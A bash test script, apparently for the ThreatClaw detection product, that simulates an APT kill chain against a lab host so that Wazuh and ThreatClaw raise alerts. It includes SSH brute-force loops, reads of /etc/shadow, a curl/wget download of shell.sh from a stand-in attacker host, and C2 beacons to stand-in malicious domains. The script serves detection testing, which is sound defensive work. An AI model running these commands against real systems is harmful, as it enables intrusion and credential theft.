#!/bin/bash
# ═══════════════════════════════════════════════════════════
# ThreatClaw E2E Test — Simulated APT Attack
#
# Executed from monitoring server against target lab
# Wazuh agent on target detects → alerts → ThreatClaw IE processes
#
# Phases: Recon → Brute Force → Access → C2 simulation → Lateral
# ═══════════════════════════════════════════════════════════

set -e
TARS="${TC_LAB_TARGET:-10.0.0.2}"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
phase() { echo -e "\n${YELLOW}═══ PHASE $1 ═══${NC}"; }
pause() { echo -e "${GREEN}  ↳ Waiting ${1}s for Wazuh to process...${NC}"; sleep $1; }

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║  ThreatClaw E2E — Simulated APT Attack Scenario     ║"
echo "║  Target: TARS ($TARS) via WireGuard                 ║"
echo "║  Detection: Wazuh agent → CASE → ThreatClaw IE      ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── PHASE 1: Reconnaissance ──
phase "1 — RECONNAISSANCE (Discovery T1046, T1018)"
log "Port scanning TARS..."
nmap -sT -T3 --top-ports 20 $TARS -oG /dev/null 2>/dev/null || echo "  (nmap not available, using nc)"
for port in 22 80 443 389 445 21 23 2222 3306 1433 5900 8888 9090; do
    nc -zw1 $TARS $port 2>/dev/null && log "  Port $port OPEN" || true
done
pause 10

log "LDAP enumeration..."
ldapsearch -x -H ldap://$TARS -b "dc=pme-test,dc=local" -LLL "(objectClass=*)" dn 2>/dev/null | head -5 || log "  (ldapsearch not available)"
pause 5

# ── PHASE 2: Brute Force ──
phase "2 — BRUTE FORCE (Credential Access T1110)"
log "SSH brute force on port 2222 (10 attempts with wrong passwords)..."
for i in $(seq 1 10); do
    sshpass -p "wrong_password_$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p 2222 admin@$TARS "id" 2>/dev/null || true
done
log "  10 failed SSH attempts sent"
pause 15

# ── PHASE 3: Successful Access ──
phase "3 — INITIAL ACCESS (T1078 Valid Accounts)"
log "SSH login with valid credentials..."
sshpass -p "LabSSH2026!" ssh -o StrictHostKeyChecking=no -p 2222 admin@$TARS "
echo '=== PHASE 3: Authenticated ==='
whoami
id
uname -a
" 2>/dev/null || log "  (SSH access failed — container may need restart)"
pause 10

# ── PHASE 4: Post-exploitation ──
phase "4 — POST-EXPLOITATION (Execution T1059, Discovery T1082)"
log "Running suspicious commands via SSH..."
sshpass -p "LabSSH2026!" ssh -o StrictHostKeyChecking=no -p 2222 admin@$TARS "
# System enumeration (T1082)
cat /etc/passwd 2>/dev/null | wc -l
cat /etc/shadow 2>/dev/null | wc -l
ls -la /root/ 2>/dev/null

# Network discovery (T1016)
ip addr 2>/dev/null || ifconfig 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

# Process enumeration (T1057)
ps aux 2>/dev/null | head -5

# Simulated download attempt (T1105)
curl -s http://evil-payload.xyz/shell.sh 2>/dev/null || wget -q http://evil-payload.xyz/shell.sh 2>/dev/null || true
" 2>/dev/null || log "  (Post-exploitation commands failed)"
pause 15

# ── PHASE 5: C2 Simulation ──
phase "5 — C2 COMMUNICATION (Command & Control T1071)"
log "Simulating C2 beacons (DNS + HTTP to known-bad IoC)..."

# DNS queries to suspicious domains (should trigger Bloom filter via logs)
for domain in "update-service.xyz" "cdn-analytics.top" "api-gateway.click"; do
    dig $domain @$TARS 2>/dev/null || nslookup $domain $TARS 2>/dev/null || host $domain 2>/dev/null || true
    log "  DNS query: $domain"
done

# HTTP requests to suspicious URLs
for url in "http://evil-payload.xyz/beacon" "http://malware-c2.top/check-in"; do
    curl -s --max-time 3 "$url" 2>/dev/null || true
    log "  HTTP beacon: $url"
done
pause 15

# ── PHASE 6: Lateral Movement Simulation ──
phase "6 — LATERAL MOVEMENT (T1021 Remote Services)"
log "SSH from TARS to other internal services..."
sshpass -p "LabSSH2026!" ssh -o StrictHostKeyChecking=no -p 2222 admin@$TARS "
# Try to reach other services from inside (lateral movement)
curl -s --max-time 2 http://localhost:80 >/dev/null 2>&1 && echo 'HTTP reached internally'
# Simulate pivot attempt
for target in 10.0.0.3 10.0.0.1 10.0.0.4; do
    nc -zw1 \$target 22 2>/dev/null && echo \"SSH open on \$target\" || true
done
" 2>/dev/null || log "  (Lateral movement simulation failed)"
pause 10

# ── Summary ──
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════╗"
echo "║  Attack scenario completed!                          ║"
echo "║                                                      ║"
echo "║  What should happen in ThreatClaw:                   ║"
echo "║  1. Wazuh alerts: SSH brute force + auth success     ║"
echo "║  2. Sigma Engine: pattern matching on logs           ║"
echo "║  3. Bloom Filter: IoC detection (C2 domains)         ║"
echo "║  4. IE: kill chain detected (finding + alert)        ║"
echo "║  5. Score global drops → investigation LLM           ║"
echo "║  6. Graph: lateral movement detection                ║"
echo "║                                                      ║"
echo "║  Check: https://your-server:8445                     ║"
echo -e "╚══════════════════════════════════════════════════════╝${NC}"
